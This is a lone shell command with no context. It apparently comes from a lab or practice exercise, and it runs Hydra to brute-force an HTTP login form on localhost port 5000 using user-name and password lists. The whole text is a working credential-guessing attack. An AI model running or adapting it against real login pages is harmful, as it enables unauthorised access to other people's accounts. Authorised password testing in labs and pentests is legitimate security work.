hydra -L users.txt -P passwords.txt 127.0.0.1 http-post-form "/:username=^USER^&password=^PASS^:F=Login failed. Try again." -s 5000 -V
